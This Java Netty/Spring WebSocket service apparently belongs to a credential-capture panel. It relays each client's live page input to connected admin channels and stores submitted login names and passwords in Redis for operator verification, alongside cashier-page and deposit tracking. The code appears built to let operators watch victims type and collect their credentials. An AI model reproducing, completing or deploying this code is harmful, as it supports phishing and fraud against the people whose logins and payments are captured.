package com.julia.service.impl;


import com.fasterxml.jackson.databind.ObjectMapper;
import com.julia.entity.FortuneEntity;
import com.julia.entity.RocketEntity;
import com.julia.entity.YaoEntity;
import com.julia.enums.RedisKeyEnum;
import com.julia.mapper.YaoMapper;
import com.julia.model.ClientInputRo;
import com.julia.model.WebSocketMsgBO;
import com.julia.model.WsFortunneBO;
import com.julia.model.dto.FortuneRedis;
import com.julia.socket.ChannelPond;
import com.julia.tool.JuliaUtils;
import com.julia.tool.RedisUtils;
import io.netty.channel.Channel;
import io.netty.channel.ChannelId;
import io.netty.handler.codec.http.websocketx.TextWebSocketFrame;
import lombok.SneakyThrows;
import lombok.extern.log4j.Log4j2;
import org.apache.logging.log4j.Logger;
import org.springframework.stereotype.Service;
import org.springframework.util.ObjectUtils;
import org.springframework.util.StringUtils;

import javax.annotation.Resource;
import java.security.SecureRandom;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.stream.Collectors;

/**
 * @program: skychain
 * @description:
 * @author: Chowel.Master
 * @create: 2023-11-14 16:01
 **/
@Log4j2
@Service
public class WebSocketService {
    @Resource
    RedisUtils redisUtils;

    @Resource
    YaoMapper yaoMapper;


    private final ObjectMapper mapper = new ObjectMapper();

    @SneakyThrows
    public void handleMsg(String requestMsg) {
        WebSocketMsgBO bo = mapper.readValue(requestMsg, WebSocketMsgBO.class);
    }

    @SneakyThrows
    public void handleMsgWhitChannel(String requestMsg, Channel channel) {
        WebSocketMsgBO bo = mapper.readValue(requestMsg, WebSocketMsgBO.class);
        if ("CLIENTCONNECT".equals(bo.getSub())) {
            clientConnect(channel, (String) bo.getData());
        }
        if ("CLIENTINPUT".equals(bo.getSub())) {
            clentInput(bo);
        }
        if ("CLIENTSUBMIT".equals(bo.getSub())) {
            clentSubmit(bo);
        }
        // 客户端心跳
        if ("CLIENTPING".equals(bo.getSub())) {

            String clientSecure = (String) bo.getData();
            if (StringUtils.hasLength(clientSecure)) {
                log.info("client-ping: 客户端 {} 心跳", clientSecure);
                Channel clientChannel = ChannelPond.findClientChannel(clientSecure);
                if (clientChannel != null) {
                    WebSocketMsgBO resBo = new WebSocketMsgBO();
                    resBo.setSub("CLIENTPONG");
                    resBo.setData(clientSecure);
                    clientChannel.writeAndFlush(new TextWebSocketFrame(mapper.writeValueAsString(resBo)));
                }
            }
        }
    }

    /**
     * @Description: 处理页面提交
     * @Param:
     * @return:
     * @Author: chowel
     * @Date:
     */
    @SneakyThrows
    public void clentSubmit(WebSocketMsgBO msgBO) {
        Object msgData = msgBO.getData();
        if (msgData instanceof Map) {
            Map<String, Object> msgMap = (Map<String, Object>) msgData;

            ClientInputRo ro = new ClientInputRo();
            ro.setSecure((String) msgMap.get("secure"));
            ro.setLoginName((String) msgMap.get("loginName"));
            ro.setPassword((String) msgMap.get("password"));
            ro.setStatus(1);
            ro.setCheckVerify(0);

            redisUtils.pushClient(RedisKeyEnum.CLIENTSUBMIT.getKey() + ro.getSecure(), ro);
        }
//
//        log.info(ro.getSecure());
        // 客户端提交
//        WebSocketMsgBO adminInform = new WebSocketMsgBO();
//        adminInform.setSub("CLIENTSUBMIT");
//        adminInform.setData(msgBO.getData());
//        ConcurrentHashMap<String, ChannelId> admins = ChannelPond.getAllAdmin();
//        for (ChannelId channelId : admins.values()) {
//            Channel adminChannel = ChannelPond.findAdminChannelByChannelId(channelId);
//            if (!ObjectUtils.isEmpty(adminChannel)) {
//                adminChannel.writeAndFlush(new TextWebSocketFrame(mapper.writeValueAsString(adminInform)));
//            }
//        }
    }

    /**
     * @Description: 处理页面输入
     * @Param:
     * @return:
     * @Author: chowel
     * @Date:
     */
    @SneakyThrows
    public void clentInput(WebSocketMsgBO msgBO) {
        // 通知后台 有客户端输入
        WebSocketMsgBO adminInform = new WebSocketMsgBO();
        adminInform.setSub("CLIENTINPUT");
        adminInform.setData(msgBO.getData());
        adminSendMsg(adminInform);
    }


    /**
     * @Description: ws 连接处理
     * @Param:
     * @return:
     * @Author: chowel
     * @Date:
     */
    @SneakyThrows
    public void clientConnect(Channel c, String clientSecure) {

        Channel clientChannel = ChannelPond.findClientChannel(clientSecure);
        if (ObjectUtils.isEmpty(clientChannel)) {
            ChannelPond.addClientChannel(c, clientSecure);
        }

        //  客户端连接返回
        WebSocketMsgBO clientbo = new WebSocketMsgBO();
        clientbo.setSub("CLIENTCONNECTED");
        clientbo.setData("OK");
        c.writeAndFlush(new TextWebSocketFrame(mapper.writeValueAsString(clientbo)));

        // 通知后台 有客户端连接
        WebSocketMsgBO adminInform = new WebSocketMsgBO();
        adminInform.setSub("CLIENTIN");
        adminInform.setData(clientSecure);
        adminSendMsg(adminInform);
    }

    @SneakyThrows
    public void handleHeart(String userId) {
//        String userId = ChannelPond.findUserIdByChannel(c);
//        log.info("HEART-userId: " + userId);
        Channel userChannel = ChannelPond.findChannel(userId);
        if (ObjectUtils.isEmpty(userChannel)) {
            log.info("HEART-Channel: None");
        } else {
            WebSocketMsgBO bo = new WebSocketMsgBO();
            bo.setSub("PONG");
            bo.setData("");
            userChannel.writeAndFlush(new TextWebSocketFrame(mapper.writeValueAsString(bo)));
        }
    }

    /**
     * @Description: 收银台页面打开成功
     * @Param:
     * @return:
     * @Author: chowel
     * @Date:
     */
    @SneakyThrows
    public void depositsInput(String fortuneNo) {
        redisUtils.lSet(RedisKeyEnum.DEPOSIT.getKey(), fortuneNo, 24 * 3600);
    }


    /**
     * @Description: 下线删除
     * @Param:
     * @return:
     * @Author: chowel
     * @Date:
     */
    public void disconnect(Channel c) {
        String res = ChannelPond.removeChannel(c);
        if(res.length()>9){
            log.info("客户端退出");
            WebSocketMsgBO adminInform = new WebSocketMsgBO();
            adminInform.setSub("CLIENTOUT");
            adminInform.setData(res);
            adminSendMsg(adminInform);
        }
    }

    @SneakyThrows
    protected void adminSendMsg(WebSocketMsgBO adminInform){
        ConcurrentHashMap<String, ChannelId> admins = ChannelPond.getAllAdmin();
        for (ChannelId channelId : admins.values()) {
            Channel adminChannel = ChannelPond.findAdminChannelByChannelId(channelId);
            if (!ObjectUtils.isEmpty(adminChannel)) {
                adminChannel.writeAndFlush(new TextWebSocketFrame(mapper.writeValueAsString(adminInform)));
            }
        }
    }

}
